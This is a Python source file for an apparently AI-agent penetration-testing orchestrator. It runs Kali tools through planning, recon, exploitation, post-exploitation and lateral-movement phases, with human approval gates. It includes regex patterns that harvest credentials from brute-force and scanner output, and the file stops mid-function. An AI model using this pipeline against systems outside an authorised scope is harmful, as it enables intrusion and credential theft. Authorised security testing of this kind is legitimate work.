"""
ATHENA Agent Orchestration Engine.

Replaces demo simulation with real Kali tool execution across both backends.
Follows PTES 7-phase methodology with full WebSocket event streaming and
HITL approval gates for exploitation/post-exploitation.

Architecture:
    Orchestrator
      ├── EngagementContext  (shared state for the engagement)
      ├── AgentRunner        (per-agent: think, run_tool, report_finding, request_approval)
      └── 7 PTES phases      (each wires specific agents to real tools)

All execution is async within the FastAPI process — same pattern as the
existing demo scenario, but calling real Kali HTTP endpoints.
"""

import asyncio
import json
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import TYPE_CHECKING, Optional
from urllib.parse import urlparse

# Pre-compiled regex to strip ANSI escape codes from CLI tool output
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]|\x1b\].*?\x07|\x1b\(B")


def extract_hosts(targets: list[str]) -> list[str]:
    """Extract unique hostnames/IPs from a list of targets (URLs or bare hosts)."""
    hosts = set()
    for t in targets:
        if "://" in t:
            parsed = urlparse(t)
            host = parsed.hostname
            if host:
                hosts.add(host)
        else:
            # Bare IP or hostname — strip any trailing path
            hosts.add(t.split("/")[0].split(":")[0])
    return list(hosts)

from kali_client import KaliClient, ToolResult
from parsers import (
    extract_cves,
    parse_arjun,
    parse_attackerkb_response,
    parse_commix,
    parse_curl,
    parse_dalfox,
    parse_feroxbuster,
    parse_ffuf,
    parse_js_analysis,
    parse_netexec_output,
    parse_gau_output,
    parse_gobuster_output,
    parse_httpx_results,
    parse_msf_search_output,
    parse_naabu_results,
    parse_nikto_output,
    parse_nmap_output,
    parse_nuclei_results,
    parse_searchsploit_json,
    parse_sqlmap_output,
    parse_subfinder_output,
    parse_wpscan_output,
    severity_from_cvss,
    validate_scope,
)

if TYPE_CHECKING:
    from server import DashboardState

logger = logging.getLogger(__name__)


# ── Engagement Context ──

@dataclass
class EngagementContext:
    """Shared state for a running engagement."""
    engagement_id: str
    scope: dict  # {"targets": [...], "exclusions": [...]}
    target_type: str  # "external" or "internal"
    backend_override: str = ""  # Force specific backend ("external" or "internal")
    ptes_phase: int = 0
    stopped: bool = False

    # Accumulated results
    discovered_hosts: list = field(default_factory=list)
    discovered_services: list = field(default_factory=list)
    discovered_urls: list = field(default_factory=list)
    discovered_subdomains: list = field(default_factory=list)
    discovered_vulns: list = field(default_factory=list)
    findings: list = field(default_factory=list)
    cves: list = field(default_factory=list)

    # Phase E: Web App Testing
    discovered_endpoints: list = field(default_factory=list)
    # [{url, method, source_agent, params: [], base_url}]
    discovered_params: dict = field(default_factory=dict)
    # {endpoint_url: [param1, param2, ...]}
    auth_context: dict = field(default_factory=dict)
    # {tokens: [], cookies: [], credentials: [{user, pass, source}]}
    attack_chains: list = field(default_factory=list)
    # [{id, name, steps: [{agent, finding_id, description}], severity, impact}]

    # Stats for dashboard
    host_count: int = 0
    service_count: int = 0
    vuln_count: int = 0
    finding_count: int = 0


# ── Agent Runner ──

class AgentRunner:
    """Runs a single agent's tasks with full event lifecycle.

    Provides methods to emit thinking events, execute tools with streaming,
    report findings to Neo4j, and request HITL approval with blocking.
    """

    def __init__(
        self,
        agent_code: str,
        state: "DashboardState",
        kali: KaliClient,
        ctx: EngagementContext,
    ):
        self.agent = agent_code
        self.state = state
        self.kali = kali
        self.ctx = ctx

    def _check_stopped(self):
        """Raise if engagement was stopped (checks both ctx flag and server flag)."""
        if self.ctx.stopped:
            raise EngagementStopped()
        # Also check server-side stop flag (set by /api/engagement/{eid}/stop)
        if self.state.engagement_stopped:
            self.ctx.stopped = True
            raise EngagementStopped()

    async def _checkpoint(self):
        """Check stop flag AND wait if paused. Call between tool executions."""
        self._check_stopped()
        # Block here if engagement is paused (event is cleared)
        await self.state.engagement_pause_event.wait()
        # Re-check stop after resume (operator may have stopped while paused)
        self._check_stopped()

    async def think(self, thought: str, reasoning: str, action: str = ""):
        """Emit agent_thinking event to dashboard."""
        await self._checkpoint()
        from server import AgentEvent, AgentStatus, AGENT_NAMES
        await self.state.update_agent_status(self.agent, AgentStatus.RUNNING, thought)
        metadata = {"thought": thought, "reasoning": reasoning}
        if action:
            metadata["action"] = action
        event = AgentEvent(
            id=str(uuid.uuid4())[:8],
            type="agent_thinking",
            agent=self.agent,
            content=thought,
            timestamp=time.time(),
            metadata=metadata,
        )
        await self.state.add_event(event)

    async def run_tool(
        self,
        tool_name: str,
        params: dict,
        display: str = "",
        backend: str = "auto",
    ) -> ToolResult:
        """Execute a tool with full WebSocket event lifecycle.

        Emits: tool_start → progress chunks (for long tools) → tool_complete
        Also records a scan entry in state.scans for the Scans page.
        """
        await self._checkpoint()
        from server import AgentEvent, AGENT_NAMES

        tool_id = str(uuid.uuid4())[:8]
        tool_display = display or f"Running {tool_name}..."
        start_time = time.time()
        start_iso = datetime.now(timezone.utc).isoformat()

        # Look up display name from tool registry
        tool_def = {}
        for t in self.kali.list_tools():
            if t.get("name") == tool_name:
                tool_def = t
                break

        # Create running scan record BEFORE execution so Scans page shows it live
        scan_record = {
            "id": f"scan-{tool_id}",
            "tool": tool_name,
            "tool_display": tool_def.get("display_name", tool_display),
            "target": params.get("target", params.get("url", params.get("targets", [""])[0] if isinstance(params.get("targets"), list) else "")),
            "agent": self.agent,
            "status": "running",
            "duration_s": 0,
            "findings_count": 0,
            "started_at": start_iso,
            "completed_at": None,
            "engagement_id": self.ctx.engagement_id,
            "output_preview": "",
            "command": tool_display,
        }
        self.state.scans.append(scan_record)

        # tool_start
        await self.state.add_event(AgentEvent(
            id=str(uuid.uuid4())[:8],
            type="tool_start",
            agent=self.agent,
            content=tool_display,
            timestamp=start_time,
            metadata={"tool": tool_name, "tool_id": tool_id},
        ))
        # Broadcast so Scans page shows running entry immediately
        await self.state.broadcast({
            "type": "scan_update",
            "scan": scan_record,
            "timestamp": time.time(),
        })

        # Execute on Kali (backend_override takes precedence over auto-selection)
        # Retry loop: if tool was killed during pause, re-run it on resume
        effective_backend = self.ctx.backend_override or backend
        while True:
            result = await self.kali.run_tool(
                tool_name, params,
                backend=effective_backend,
                target_type=self.ctx.target_type,
            )

            # Re-check stop/pause after long-running tool returns
            await self._checkpoint()

            # If this scan was killed during pause, re-run it so we don't miss vulns
            if scan_record.get("status") == "paused":
                logger.info(f"Re-running {tool_name} after pause (was killed mid-scan)")
                scan_record["status"] = "running"
                scan_record["started_at"] = datetime.now(timezone.utc).isoformat()
                await self.state.broadcast({
                    "type": "scan_update", "scan": scan_record, "timestamp": time.time(),
                })
                await self.state.broadcast({
                    "type": "system",
                    "content": f"Re-running {tool_def.get('display_name', tool_name)} (interrupted by pause)",
                    "timestamp": time.time(),
                })
                continue  # Re-run the same tool
            break  # Normal completion — exit loop

        end_iso = datetime.now(timezone.utc).isoformat()

        # Strip ANSI color codes from tool output (many CLI tools emit them)
        if result.stdout:
            result.stdout = _ANSI_RE.sub("", result.stdout)
        if result.stderr:
            result.stderr = _ANSI_RE.sub("", result.stderr)

        # Stream output in chunks for dashboard display
        if result.stdout:
            await self._stream_output(tool_id, result.stdout)
        if result.stderr and not result.success:
            await self._stream_output(tool_id, f"\n[STDERR]\n{result.stderr}")

        # tool_complete
        summary = self._summarize_output(result)
        await self.state.add_event(AgentEvent(
            id=str(uuid.uuid4())[:8],
            type="tool_complete",
            agent=self.agent,
            content=summary,
            timestamp=time.time(),
            metadata={"tool_id": tool_id, "elapsed_s": result.elapsed_s, "success": result.success},
        ))

        # Update scan record with final results
        # Skip instant connection failures (0s errors = backend unavailable, not a real scan)
        if not result.success and result.elapsed_s < 0.5 and not result.stdout:
            logger.info(f"Removing scan record for {tool_name}: instant failure (backend unavailable)")
            self.state.scans = [s for s in self.state.scans if s["id"] != scan_record["id"]]
        else:
            # Tools like Nikto exit non-zero even on success; treat as completed if we got output
            scan_record["status"] = "completed" if (result.success or result.stdout) else "error"
            scan_record["duration_s"] = round(result.elapsed_s)
            scan_record["completed_at"] = end_iso
            scan_record["output_preview"] = (result.stdout if result.stdout else "")

            # Broadcast scan completion so Scans page updates in real-time
            await self.state.broadcast({
                "type": "scan_complete",
                "scan": scan_record,
                "timestamp": time.time(),
            })

        # Generic credential extraction from ANY tool output
        if result.stdout and result.success:
            await self._extract_credentials_from_output(
                tool_name, result.stdout,
                params.get("target", params.get("url", "")),
            )

        return result

    async def _extract_credentials_from_output(
        self, tool_name: str, output: str, target: str,
    ):
        """Parse tool output for credential patterns from any tool.

        Patterns detected:
        - Hydra:     [22][ssh] host: 10.0.0.1   login: admin   password: admin123
        - NetExec:   SMB  10.0.0.1  445  WORKGROUP  [+] admin:password (Pwned!)
        - CrackMapExec: same as NetExec
        - Nuclei:    [default-login] ... login=admin&password=admin
        - Nmap NSE:  Credentials valid: admin:admin, ...
        - Generic:   username: X  password: Y  (case insensitive)
        """
        import re as _re

        found = []

        # Hydra-style: [port][service] host: X   login: Y   password: Z
        for m in _re.finditer(
            r'\[(\d+)\]\[(\w+)\]\s*host:\s*(\S+)\s+login:\s*(\S+)\s+password:\s*(\S+)',
            output, _re.IGNORECASE,
        ):
            found.append({
                "username": m.group(4),
                "password": "***",
                "service": m.group(2).upper(),
                "port": m.group(1),
                "host": m.group(3),
                "source": f"Hydra ({tool_name})",
                "type": "harvested",
                "access_level": "user",
            })

        # NetExec/CrackMapExec: [+] user:password (Pwned!)
        for m in _re.finditer(
            r'\[\+\]\s*(?:\S+\s+)?(\S+?):(\S+?)(?:\s+\(Pwned!?\)|$)',
            output,
        ):
            user = m.group(1)
            if user and user.lower() not in ("unknown", "", "smb", "ssh", "http"):
                found.append({
                    "username": user,
                    "password": "***",
                    "service": tool_name,
                    "host": target,
                    "source": f"NetExec/CME ({tool_name})",
                    "type": "harvested",
                    "access_level": "user",
                })

        # Nuclei default-login templates: often contain login=X&password=Y or user=X&pass=Y
        for m in _re.finditer(
            r'(?:login|user(?:name)?)=([^&\s"]+).*?(?:password|pass(?:wd)?)=([^&\s"]+)',
            output, _re.IGNORECASE,
        ):
            user = m.group(1)
            if user and user.lower() not in ("unknown", "", "{{", "{%"):
                found.append({
                    "username": user,
                    "password": "***",
                    "service": tool_name,
                    "host": target,
                    "source": f"Nuclei ({tool_name})",
                    "type": "default",
                    "access_level": "user",
                })

        # Nmap NSE credentials: "Valid credentials" or "Credentials valid"
        for m in _re.finditer(
            r'(?:valid\s+credentials?|credentials?\s+valid)[:\s]+(\S+):(\S+)',
            output, _re.IGNORECASE,
        ):
            found.append({
                "username": m.group(1),
                "password": "***",
                "service": tool_name,
                "host": target,
                "source": f"Nmap NSE ({tool_name})",
                "type": "default",
                "access_level": "user",
            })

        # Generic: "Login: X  Password: Y" or "username: X  password: Y"
        for m in _re.finditer(
            r'(?:login|username)\s*[=:]\s*["\']?(\S+?)["\']?\s+password\s*[=:]\s*["\']?(\S+?)["\']?(?:\s|$)',
            output, _re.IGNORECASE,
        ):
            user = m.group(1)
            if user and user.lower() not in ("unknown", "", "none", "null"):
                found.append({
                    "username": user,
                    "password": "***",
                    "service": tool_name,
                    "host": target,
                    "source": tool_name,
                    "type": "harvested",
                    "access_level": "user",
                })

        # Deduplicate by username+host before recording
        seen = set()
        for cred in found:
            key = f"{cred['username']}@{cred.get('host', '')}:{cred.get('port', '')}"
            if key in seen:
                continue
            seen.add(key)
            # Determine access level from username
            if cred["username"].lower() in ("root", "administrator", "admin", "system"):
                cred["access_level"] = "root"
            await self.state.add_credential(self.ctx.engagement_id, cred)

    async def _stream_output(self, tool_id: str, output: str, chunk_size: int = 512):
        """Stream tool output in chunks to WebSocket clients."""
        from server import AGENT_NAMES
        for i in range(0, len(output), chunk_size):
            chunk = output[i:i + chunk_size]
            await self.state.broadcast({
                "type": "tool_output_chunk",
                "agent": self.agent,
                "agentName": AGENT_NAMES.get(self.agent, self.agent),
                "tool_id": tool_id,
                "chunk": chunk,
                "timestamp": time.time(),
            })
            # Small delay between chunks for UI rendering
            await asyncio.sleep(0.05)

    def _summarize_output(self, result: ToolResult) -> str:
        """Create a short summary of tool output for the timeline."""
        if not result.success:
            return f"{result.tool} failed: {result.error or result.stderr[:200]}"
        # Count output lines as proxy for result size
        lines = result.stdout.strip().split("\n") if result.stdout else []
        return f"{result.tool} completed in {result.elapsed_s:.1f}s ({len(lines)} lines output)"

    @staticmethod
    def _normalize_finding_title(title: str) -> str:
        """Normalize a finding title for dedup matching.

        Strips 'Confirmed: ' prefix and ' (Metasploit)' / ' (Nuclei)' suffixes
        so discovery and confirmation findings match.
        """
        import re as _re
        t = title.strip()
        t = _re.sub(r'^Confirmed:\s*', '', t)
        t = _re.sub(r'\s*\((Metasploit|Nuclei)\)\s*$', '', t)
        return t.lower()

    @staticmethod
    def _normalize_target(target: str) -> str:
        """Extract host IP/hostname from a target for dedup comparison.

        Handles: '10.1.1.25', 'http://10.1.1.25:80/cgi-bin/php',
                 '10.1.1.25:80', 'https://host:443/path'
        """
        import re as _re
        t = target.strip()
        m = _re.search(r'://([^:/]+)', t)
        if m:
            return m.group(1).lower()
        # host:port
        if ':' in t:
            return t.rsplit(':', 1)[0].lower()
        return t.lower()

    async def report_finding(
        self,
        title: str,
        severity: str,
        category: str,
        target: str,
        description: str,
        cvss: float = 0.0,
        cve: str = "",
        evidence: str = "",
        write_neo4j: bool = True,
    ):
        """Report a vulnerability finding to Neo4j and dashboard."""
        await self._checkpoint()
        from server import Finding, Severity

        normalized_title = self._normalize_finding_title(title)
        normalized_target = self._normalize_target(target)
        is_confirmation = (
            title.startswith("Confirmed:") or
            category in ("Validated Exploit", "Injection")
        )

        # Check for existing finding to upgrade or dedup
        for existing in self.ctx.findings:
            existing_norm = self._normalize_finding_title(existing.get("title", ""))
            existing_target_norm = self._normalize_target(existing.get("target", ""))

            # Exact dedup: same normalized title + same host
            titles_match = existing_norm == normalized_title
            # CVE dedup: same CVE + same host
            cve_match = cve and existing.get("cve") and cve == existing.get("cve")

            if (titles_match or cve_match) and existing_target_norm == normalized_target:
                if is_confirmation and existing.get("category") != "Validated Exploit":
                    # Upgrade: confirmation supersedes discovery
                    await self._upgrade_finding(
                        existing, title, severity, category,
                        description, cvss, cve, evidence, write_neo4j,
                    )
                    return
                else:
                    # Pure duplicate — skip
                    await self.think(
                        thought=f"Skipping duplicate finding: {title} on {target}",
                        reasoning="Finding with same CVE/title and target already reported.",
                    )
                    return

        # New finding — create as normal
        finding_id = str(uuid.uuid4())[:8]
        timestamp = time.time()

        try:
            sev = Severity(severity)
        except ValueError:
            sev = Severity.MEDIUM

        finding = Finding(
            id=finding_id,
            title=title,
            severity=sev,
            category=category,
            target=target,
            agent=self.agent,
            description=description,
            cvss=cvss,
            cve=cve or None,
            evidence=evidence or None,
            timestamp=timestamp,
            engagement=self.ctx.engagement_id,
        )
        await self.state.add_finding(finding)

        # Write to Neo4j (skip for informational findings like "no hosts")
        if write_neo4j:
            await self._write_finding_neo4j(finding_id, title, severity, category,
                                            target, description, cvss, cve, evidence)

        self.ctx.findings.append({
            "id": finding_id, "title": title, "severity": severity,
            "category": category, "target": target, "cvss": cvss, "cve": cve,
        })
        self.ctx.finding_count += 1

        # Increment findings_count on the most recent scan for this agent
        for scan in reversed(self.state.scans):
            if scan["agent"] == self.agent and scan["engagement_id"] == self.ctx.engagement_id:
                scan["findings_count"] += 1
                break

        await self._emit_stats()

    async def _upgrade_finding(
        self,
        existing: dict,
        title: str,
        severity: str,
        category: str,
        description: str,
        cvss: float,
        cve: str,
        evidence: str,
        write_neo4j: bool,
    ):
        """Upgrade a discovery finding to a confirmed/validated finding."""
        from server import Severity

        finding_id = existing["id"]

        await self.think(
            thought=f"Upgrading finding {finding_id} to confirmed: {title}",
            reasoning="Exploitation confirmed a previously discovered vulnerability. "
                      "Upgrading in-place rather than creating a duplicate.",
        )

        # Update in-memory context entry
        existing["title"] = title
        existing["severity"] = severity
        existing["category"] = category
        if cvss > existing.get("cvss", 0):
            existing["cvss"] = cvss
        if cve and not existing.get("cve"):
            existing["cve"] = cve

        # Update in-memory state.findings list
        for f in self.state.findings:
            if f.id == finding_id:
                f.title = title
                try:
                    f.severity = Severity(severity)
                except ValueError:
                    pass
                f.category = category
                if cvss > (f.cvss or 0):
                    f.cvss = cvss
                if cve and not f.cve:
                    f.cve = cve
                if evidence:
                    f.evidence = evidence
                f.description = description
                break

        # Update Neo4j node
        if write_neo4j:
            from server import neo4j_available, neo4j_driver
            if neo4j_available and neo4j_driver:
                try:
                    with neo4j_driver.session() as session:
                        session.run("""
                            MATCH (f:Finding {id: $id})
                            SET f.title = $title, f.severity = $severity,
                                f.category = $category, f.description = $description,
                                f.cvss = $cvss, f.evidence = $evidence
                            WITH f
                            FOREACH (_ IN CASE WHEN $cve <> '' THEN [1] ELSE [] END |
                                SET f.cve = $cve
                            )
                        """, id=finding_id, title=title, severity=severity,
                             category=category, description=description,
                             cvss=cvss, cve=cve, evidence=evidence or "")
                except Exception as e:
                    logger.warning("Neo4j finding upgrade error: %s", e)

        # Broadcast upgrade to dashboard (same event type, dashboard will update)
        await self.state.broadcast({
            "type": "finding_upgraded",
            "id": finding_id,
            "title": title,
            "severity": severity,
            "category": category,
            "cvss": cvss,
            "cve": cve,
            "agent": self.agent,
            "description": description,
            "evidence": evidence[:500] if evidence else "",
            "engagement": self.ctx.engagement_id,
        })

    async def _write_finding_neo4j(self, fid, title, severity, category,
                                    target, description, cvss, cve, evidence):
        """Write finding to Neo4j using the same pattern as server.py."""
        from server import neo4j_available, neo4j_driver
        if not neo4j_available or not neo4j_driver:
            return
        try:
            # Extract host IP from target (may be URL, IP:port, or bare IP)
            import re as _re
            host_ip = target or ""
            m = _re.search(r'://([^:/]+)', host_ip)
            if m:
                host_ip = m.group(1)
            elif ':' in host_ip:
                # Strip port from bare IP:port (e.g. "10.1.1.25:3632" → "10.1.1.25")
                host_ip = host_ip.split(':')[0]

            with neo4j_driver.session() as session:
                session.run("""
                    MERGE (f:Finding {id: $id})
                    SET f.title = $title, f.severity = $severity,
                        f.category = $category, f.target = $target,
                        f.agent = $agent, f.description = $description,
                        f.cvss = $cvss, f.cve = $cve, f.evidence = $evidence,
                        f.timestamp = $timestamp, f.engagement_id = $eid,
                        f.status = 'open'
                    WITH f
                    MATCH (e:Engagement {id: $eid})
                    MERGE (f)-[:BELONGS_TO]->(e)
                    WITH f
                    OPTIONAL MATCH (h:Host {ip: $host_ip, engagement_id: $eid})
                    FOREACH (_ IN CASE WHEN h IS NOT NULL THEN [1] ELSE [] END |
                        MERGE (f)-[:AFFECTS]->(h)
                    )
                """, id=fid, title=title, severity=severity,
                     category=category, target=target, agent=self.agent,
                     description=description, cvss=cvss, cve=cve,
                     evidence=evidence, timestamp=time.time(),
                     eid=self.ctx.engagement_id, host_ip=host_ip)
        except Exception as e:
            logger.warning("Neo4j finding write error: %s", e)

    async def request_approval(
        self,
        action: str,
        description: str,
        risk_level: str = "high",
        target: str = "",
    ) -> bool:
        """Request HITL approval and BLOCK until operator responds.

        Returns True if approved, False if rejected.
        """
        await self._checkpoint()
        from server import ApprovalRequest, ApprovalStatus

        approval_id = str(uuid.uuid4())[:8]

        # Create blocking event
        approval_event = asyncio.Event()
        self.state.approval_events[approval_id] = {
            "event": approval_event,
            "approved": None,
        }

        # Broadcast approval request
        req = ApprovalRequest(
            id=approval_id,
            agent=self.agent,
            action=action,
            description=description,
            risk_level=risk_level,
            target=target or None,
            timestamp=time.time(),
        )
        await self.state.request_approval(req)

        # Emit reminder every 5 minutes while waiting
        reminder_task = asyncio.create_task(
            self._approval_reminder(approval_id, action)
        )

        try:
            # Block until operator clicks approve/reject in dashboard
            await approval_event.wait()
        finally:
            reminder_task.cancel()

        approved = self.state.approval_events[approval_id]["approved"]
        # Cleanup
        del self.state.approval_events[approval_id]

        return approved

    async def _approval_reminder(self, approval_id: str, action: str):
        """Emit reminders every 5 minutes while waiting for approval."""
        try:
            while True:
                await asyncio.sleep(300)  # 5 minutes
                if approval_id not in self.state.approval_events:
                    break
                await self.state.broadcast({
                    "type": "system",
                    "content": f"Reminder: HITL approval pending for {action} ({self.agent})",
                    "agent": "OR",
                    "agentName": "Orchestrator",
                    "timestamp": time.time(),
                })
        except asyncio.CancelledError:
            pass

    async def complete(self, summary: str = ""):
        """Mark agent as completed."""
        await self._checkpoint()
        from server import AgentEvent, AgentStatus
        await self.state.update_agent_status(self.agent, AgentStatus.COMPLETED)
        if summary:
            await self.state.add_event(AgentEvent(
                id=str(uuid.uuid4())[:8],
                type="agent_complete",
                agent=self.agent,
                content=summary,
                timestamp=time.time(),
            ))

    async def _emit_stats(self):
        """Broadcast updated engagement stats."""
        await self.state.broadcast({
            "type": "stat_update",
            "timestamp": time.time(),
            "hosts": self.ctx.host_count,
            "services": self.ctx.service_count,
            "vulns": self.ctx.vuln_count,
            "findings": self.ctx.finding_count,
        })

    async def _sync_stats_from_neo4j(self):
        """Sync in-memory counters from Neo4j to match attack graph metrics."""
        from server import neo4j_available, neo4j_driver
        if not neo4j_available or not neo4j_driver:
            return
        try:
            eid = self.ctx.engagement_id
            with neo4j_driver.session() as session:
                result = session.run("""
                    OPTIONAL MATCH (h:Host {engagement_id: $eid})
                    WITH count(DISTINCT h) AS hosts
                    OPTIONAL MATCH (s:Service {engagement_id: $eid})
                    WITH hosts, count(DISTINCT s) AS services
                    OPTIONAL MATCH (v:Vulnerability {engagement_id: $eid})
                    WITH hosts, services, count(DISTINCT v) AS vulns
                    OPTIONAL MATCH (f:Finding {engagement_id: $eid})
                    RETURN hosts, services, vulns, count(DISTINCT f) AS findings
                """, eid=eid)
                record = result.single()
                if record:
                    self.ctx.host_count = record["hosts"]
                    self.ctx.service_count = record["services"]
                    self.ctx.vuln_count = record["vulns"]
                    self.ctx.finding_count = record["findings"]
        except Exception as e:
            logger.warning("Neo4j stats sync error: %s", e)

    async def write_hosts_neo4j(self, hosts: list[dict]):
        """Write discovered hosts and services to Neo4j."""
        from server import neo4j_available, neo4j_driver
        if not neo4j_available or not neo4j_driver:
            return
        try:
            with neo4j_driver.session() as session:
                for host in hosts:
                    ip = host.get("ip", "")
                    if not ip:
                        continue
                    session.run("""
                        MERGE (h:Host {ip: $ip, engagement_id: $eid})
                        SET h.hostname = $hostname, h.status = 'alive',
                            h.last_seen = datetime()
                        WITH h
                        MATCH (e:Engagement {id: $eid})
                        MERGE (h)-[:BELONGS_TO]->(e)
                    """, ip=ip, eid=self.ctx.engagement_id,
                         hostname=host.get("hostname", ""))

                    for port_info in host.get("ports", []):
                        session.run("""
                            MATCH (h:Host {ip: $ip, engagement_id: $eid})
                            MERGE (s:Service {port: $port, protocol: $proto,
                                              host_ip: $ip, engagement_id: $eid})
                            SET s.name = $name, s.version = $version, s.state = 'open'
                            MERGE (s)-[:RUNS_ON]->(h)
                        """, ip=ip, port=port_info.get("port", 0),
                             proto=port_info.get("protocol", "tcp"),
                             name=port_info.get("service", ""),
                             version=port_info.get("version", ""),
                             eid=self.ctx.engagement_id)
            await self._sync_stats_from_neo4j()
            await self._emit_stats()
        except Exception as e:
            logger.warning("Neo4j host write error: %s", e)

    async def write_vulns_neo4j(self, vulns: list[dict]):
        """Write discovered vulnerabilities to Neo4j."""
        from server import neo4j_available, neo4j_driver
        if not neo4j_available or not neo4j_driver:
            return
        try:
            with neo4j_driver.session() as session:
                for vuln in vulns:
                    vid = f"vuln-{uuid.uuid4().hex[:8]}"
                    # Extract host IP from matched_at URL or host field
                    host_ip = vuln.get("host", "")
                    matched = vuln.get("matched_at", "")
                    # matched_at may be a URL like http://10.1.1.25:8180/
                    # Extract the IP/hostname for linking
                    if not host_ip and matched:
                        import re as _re
                        m = _re.search(r'://([^:/]+)', matched)
                        if m:
                            host_ip = m.group(1)

                    session.run("""
                        MERGE (v:Vulnerability {
                            name: $name,
                            host: $host,
                            engagement_id: $eid
                        })
                        SET v.id = $vid, v.severity = $severity,
                            v.cve_id = $cve, v.cvss_score = $cvss,
                            v.template_id = $tmpl, v.matched_at = $matched,
                            v.description = $desc, v.status = 'open',
                            v.discovered_at = datetime()
                        WITH v
                        MATCH (e:Engagement {id: $eid})
                        MERGE (v)-[:BELONGS_TO]->(e)
                        WITH v
                        OPTIONAL MATCH (h:Host {ip: $host_ip, engagement_id: $eid})
                        FOREACH (_ IN CASE WHEN h IS NOT NULL THEN [1] ELSE [] END |
                            MERGE (v)-[:AFFECTS]->(h)
                        )
                    """, vid=vid, name=vuln.get("name", ""),
                         host=host_ip,
                         severity=vuln.get("severity", "INFO"),
                         cve=vuln.get("cve_id", ""),
                         cvss=vuln.get("cvss_score", 0),
                         tmpl=vuln.get("template_id", ""),
                         matched=matched,
                         desc=vuln.get("description", ""),
                         eid=self.ctx.engagement_id,
                         host_ip=host_ip)
            await self._sync_stats_from_neo4j()
            await self._emit_stats()
        except Exception as e:
            logger.warning("Neo4j vuln write error: %s", e)


class EngagementStopped(Exception):
    """Raised when engagement is stopped by operator."""
    pass


# ── Orchestrator ──

class Orchestrator:
    """PTES phase orchestrator. Wires agents to real Kali tools."""

    def __init__(self, state: "DashboardState", kali: KaliClient):
        self.state = state
        self.kali = kali

    def _runner(self, agent: str, ctx: EngagementContext) -> AgentRunner:
        """Create an AgentRunner for an agent."""
        return AgentRunner(agent, self.state, self.kali, ctx)

    async def run_engagement(self, engagement_id: str, backend_override: str = ""):
        """Run a full PTES engagement against real targets.

        Args:
            engagement_id: Neo4j engagement ID.
            backend_override: Force a specific Kali backend ("external" or "internal").
                When set, all tool executions use this backend regardless of
                tool-registry backend lists or auto-detection. Useful when the
                target is only reachable from one backend (e.g. Antsle bridge).
        """
        from server import AgentStatus, AGENT_NAMES

        # Load engagement from Neo4j or state
        scope = await self._load_scope(engagement_id)
        target_type = await self._detect_target_type(scope)

        ctx = EngagementContext(
            engagement_id=engagement_id,
            scope=scope,
            target_type=target_type,
            backend_override=backend_override,
        )

        # Store ctx reference so API endpoints can access attack chains
        self.state.active_orchestrator_ctx = ctx

        logger.info("Starting engagement %s (type=%s, targets=%s)",
                     engagement_id, target_type, scope.get("targets", []))

        # Emit system message
        await self._emit_system(f"Starting PTES engagement {engagement_id}")

        try:
            await self._phase_planning(ctx)
            await self._phase_recon(ctx)

            # Gate: abort early if recon found nothing (target likely unreachable)
            if not ctx.discovered_hosts and not ctx.discovered_urls:
                targets = ctx.scope.get("targets", [])
                await self._emit_system(
                    f"⚠ Recon found 0 hosts and 0 URLs for {', '.join(targets)}. "
                    f"Target may be unreachable, offline, or heavily filtered. "
                    f"Verify target is running and accessible from the "
                    f"'{ctx.backend_override or 'auto'}' backend."
                )
                or_runner = self._runner("OR", ctx)
                await or_runner.report_finding(
                    title="No reachable hosts discovered",
                    severity="high",
                    category="Recon",
                    target=", ".join(targets),
                    description=(
                        f"Active and passive reconnaissance found 0 live hosts "
                        f"across {len(targets)} target(s). Both Naabu and Nmap "
                        f"port scans returned empty results. The target may be "
                        f"offline, unreachable from the selected backend, or "
                        f"heavily firewalled. Engagement cannot proceed without "
                        f"discoverable hosts."
                    ),
                    write_neo4j=False,
                )
                await self._emit_phase("COMPLETE")
                await self._emit_system(
                    f"Engagement {engagement_id} completed early — no hosts to test. "
                    f"1 finding reported."
                )
                await self.state.update_agent_status("OR", AgentStatus.COMPLETED)
                await self._update_engagement_status(engagement_id, "completed")
                return

            await self._phase_threat_modeling(ctx)
            await self._phase_vuln_analysis(ctx)
            await self._phase_webapp_testing(ctx)
            await self._phase_exploitation(ctx)
            await self._phase_post_exploitation(ctx)
            await self._phase_lateral_movement(ctx)
            await self._phase_reporting(ctx)

            await self._emit_phase("COMPLETE")
            await self._emit_system(
                f"Engagement {engagement_id} completed. "
                f"{ctx.finding_count} findings, {ctx.host_count} hosts, "
                f"{ctx.vuln_count} vulnerabilities."
            )
            # Mark Orchestrator as completed so pulse dot stops
            await self.state.update_agent_status("OR", AgentStatus.COMPLETED)

            # Update engagement status in Neo4j
            await self._update_engagement_status(engagement_id, "completed")

        except EngagementStopped:
            await self._emit_phase("STOPPED")
            await self._emit_system(f"Engagement {engagement_id} stopped by operator.")
            for code in AGENT_NAMES:
                if self.state.agent_statuses[code] != AgentStatus.IDLE:
                    await self.state.update_agent_status(code, AgentStatus.IDLE)

        except asyncio.CancelledError:
            await self._emit_phase("STOPPED")
            await self._emit_system(f"Engagement {engagement_id} cancelled.")
            for code in AGENT_NAMES:
                if self.state.agent_statuses[code] != AgentStatus.IDLE:
                    await self.state.update_agent_status(code, AgentStatus.IDLE)

        except Exception as e:
            logger.exception("Engagement %s failed: %s", engagement_id, e)
            await self._emit_system(f"Engagement {engagement_id} error: {e}")
            await self._emit_phase("ERROR")
            for code in AGENT_NAMES:
                if self.state.agent_statuses[code] != AgentStatus.IDLE:
                    await self.state.update_agent_status(code, AgentStatus.IDLE)

    # ── Phase 1: Planning ──

    async def _phase_planning(self, ctx: EngagementContext):
        """Validate scope and authorization."""
        await self._emit_phase("PLANNING")
        pl = self._runner("PL", ctx)

        await pl.think(
            thought="Validating Rules of Engagement and scope boundaries.",
            reasoning="Authorization must be confirmed before any scanning. "
                      "All targets must be in-scope per the engagement definition.",
            action="validate_roe",
        )

        # Validate scope is not empty
        targets = ctx.scope.get("targets", [])
        if not targets:
            await pl.report_finding(
                title="Empty scope — no targets defined",
                severity="critical",
                category="Planning",
                target="N/A",
                description="Engagement has no targets defined. Cannot proceed.",
            )
            ctx.stopped = True
            raise EngagementStopped()

        await pl.complete(
            f"Scope validated: {len(targets)} targets, "
            f"{len(ctx.scope.get('exclusions', []))} exclusions. "
            f"Target type: {ctx.target_type}."
        )

    # ── Phase 2: Intelligence Gathering ──

    async def _phase_recon(self, ctx: EngagementContext):
        """Run PO (passive) and AR (active) recon in parallel."""
        await self._emit_phase("INTELLIGENCE GATHERING")

        or_runner = self._runner("OR", ctx)
        await or_runner.think(
